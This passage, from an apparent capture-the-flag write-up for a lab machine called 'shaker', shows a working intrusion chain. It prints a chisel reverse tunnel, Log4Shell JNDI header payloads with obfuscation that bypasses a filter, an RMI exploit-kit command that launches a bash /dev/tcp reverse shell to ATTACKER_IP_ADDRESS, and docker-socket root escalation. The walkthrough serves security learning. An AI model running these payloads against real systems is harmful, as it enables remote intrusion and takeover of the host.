+&lt;p&gt;We know that port 8080 is a port forward to the container we're in. But what is port 8888.&lt;/p&gt;
+&lt;p&gt;At this point we could continue enumerating docker for other vulnerabilities and misconfigurations (in a penetration test we would do a full assessment of the container), but as we'll see it proved unnecessary for our objectives.&lt;/p&gt;
+&lt;h2&gt;Attacking the Host&lt;/h2&gt;
+&lt;p&gt;To check if it's an http server we can use curl, we had to download another static binary since it's not in the system:
+&lt;img alt="Curl request to 172.18.0.1:8888." src="/images/shaker/host-curl.png"&gt;&lt;/p&gt;
+&lt;p&gt;It's throwing us a Bad Request error, but it seems to reply, so we know we have something to investigate.&lt;/p&gt;
+&lt;p&gt;To take a better look at this service, we decide to use &lt;a href="https://github.com/jpillora/chisel"&gt;chisel&lt;/a&gt; to port forward port 8888 to localhost:8888 on our attack machine.&lt;/p&gt;
+&lt;p&gt;We use busybox once again to download chisel on the machine.&lt;/p&gt;
+&lt;p&gt;On our machine we start a chisel server on port 9999:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Starting the chisel server" src="/images/shaker/chisel-server.png"&gt;&lt;/p&gt;
+&lt;p&gt;On the target machine we start a client that forwards port 172.18.0.1:8888 to the chisel server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./chisel client ATTACKER_IP_ADDRESS:9999 R:8888:172.18.0.1:8888&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On our server we can confirm this is working:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Chisel server receives the port forward." src="/images/shaker/chisel-listening.png"&gt;&lt;/p&gt;
+&lt;p&gt;Let's see what our browser tells us.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Whitelabel Error Page." src="/images/shaker/whitelabel-error.png"&gt;&lt;/p&gt;
+&lt;p&gt;If we look up this error we can quickly find out that this is Spring Boot.&lt;/p&gt;
+&lt;p&gt;First google result:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="White Label Error Page is a Spring Boot error page." src="/images/shaker/whitelabel-google.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ok, so we know we're dealing with Spring Boot and tomcat. So we're still in the realm of Java applications. Are we still dealing with Log4j?&lt;/p&gt;
+&lt;p&gt;It's a possibility, but first we need to figure out why our request is bad. Let's try the HTTP Options method.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="HTTP Options Request and Response." src="/images/shaker/http-options.png"&gt;&lt;/p&gt;
+&lt;p&gt;This tells us we need to use an X-Api-Version header, so let's try using it.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="With the X-Api-Version header." src="/images/shaker/x-api-header.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ok, we have a valid request. It stands to reason that X-API-Versions would be logged per request, so we can start by injecting our Log4J payload there. And see if marshalsec gets any requests.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${jndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We unfortunately do not get a call back on marshalsec. And the response:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Error 418" src="/images/shaker/teapot.png"&gt;&lt;/p&gt;
+&lt;p&gt;Very interesting, I'm pretty sure I didn't request it to make coffee but it's giving me the famous teapot error code. It's probably the developer implementing another filter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${${::-j}ndi:${::-l}dap://ATTACKER_IP_ADDRESS:1389/Exploit}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This seems to work. We get a callback on marshalsec:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Callback to Marshalsec." src="/images/shaker/call-marshalsec2.png"&gt;&lt;/p&gt;
+&lt;p&gt;But curiously this results in no request on our HTTP server. This means LDAP probably wont cut it. Maybe it's a different JVM version or the software doesn't trust the LDAP reply.&lt;/p&gt;
+&lt;p&gt;Some further research into Spring boot and JNDI led us to: &lt;a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java"&gt;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&lt;/a&gt;
+This, interestingly talks about another, earlier, exploit. It is demonstrated using RMI, which is interesting. So perhaps, it's still possible to exploit this older vulnerability using Log4shell style lookups, via a malicious RMI server.&lt;/p&gt;
+&lt;p&gt;Ok, so at this point we can close marshalsec and look for alternatives. We could use veracode's PoC above, but I found this pearl which faciliates the exploit quite a bit:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/pimps/JNDI-Exploit-Kit"&gt;https://github.com/pimps/JNDI-Exploit-Kit&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This also incorporates a number of other things, including integration of YSOSerial payloads which can be very useful in other deserialization challenges.&lt;/p&gt;
+&lt;p&gt;Let's take a look at our options here:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="JNDI-Exploit-Kit Help." src="/images/shaker/JNDI-Kit-help.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ok, so let's try creating an RMI server that will try to execute a bash command that will give us a reverse shell on port 4455:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C &lt;span class="s1"&gt;&amp;#39;bash -i &amp;amp;&amp;gt;/dev/tcp/ATTACKER_IP_ADDRESS/4455 &amp;lt;&amp;amp;1&amp;#39;&lt;/span&gt; -R ATTACKER_IP_ADDRESS:1389 -O RMI
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Here, our reverse shell is provided by a simpler bash reverse shell payload. This is because we're attacking the Host system, so I expected the extent of system hardening to be much lower so we should be able to just execute bash.
+This JNDI exploit kit creates a nice list of URLs serving the payloads we can use:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Payload List." src="/images/shaker/JNDI-Kit.png"&gt;&lt;/p&gt;
+&lt;p&gt;We pick the exploit whose trustURLCodebase is false but have Tomcat 8+ or SpringBoot, which likely bypasses the filter that did not allow marshalsec's referal to work.&lt;/p&gt;
+&lt;p&gt;We simply have to call the provided URL from our log4j payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -H &lt;span class="s1"&gt;&amp;#39;X-API-Version: ${${::-j}ndi:${::-r}mi://ATTACKER_IP_ADDRESS:1389/ozbud1}&amp;#39;&lt;/span&gt; http://127.0.0.1:8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And catch a shell on our listener (I used pwncat in this example, which automatically stabilizes our shell):&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Reverse Shell on the Host." src="/images/shaker/pwncat.png"&gt;&lt;/p&gt;
+&lt;p&gt;And we are now be able to obtain bob's host flag.&lt;/p&gt;
+&lt;p&gt;We use pwncat to upload linpeas, make it executable and run it and take a look at the output.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Bob is a member the docker group." src="/images/shaker/docker-group.png"&gt;&lt;/p&gt;
+&lt;p&gt;Bob seems to be a member of the docker group, and docker socket is writable:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Writable Docker Socket." src="/images/shaker/docker-socket.png"&gt;&lt;/p&gt;
+&lt;p&gt;That's all we need to know we obtain root privileges on this machine.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Docker Containers and Images." src="/images/shaker/containers-images.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can see the shaker container and its image in the docker repository.&lt;/p&gt;
+&lt;p&gt;But we also know this image is severely limited. So instead we'll make our own.&lt;/p&gt;
+&lt;p&gt;On our machine we pull alpine:latest:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker pull alpine:latest
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we can use the save option to save an image to tar file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker image save alpine -o alpine.tar 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we upload this to the target machine and load it with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker image load -i alpine.tar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally we escalate to root by using this alpine image to spawn a container that mounts the host filesystem:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run -it -v /:/host/ alpine:latest chroot /host/ bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="Obtained root privileges." src="/images/shaker/root.png"&gt;&lt;/p&gt;
+&lt;p&gt;All that there's left to do is obtain the root flag.&lt;/p&gt;</content><category term="Writeups"></category><category term="writeup"></category><category term="Log4j"></category><category term="Log4Shell"></category><category term="Docker"></category><category term="Containers"></category></entry></feed>
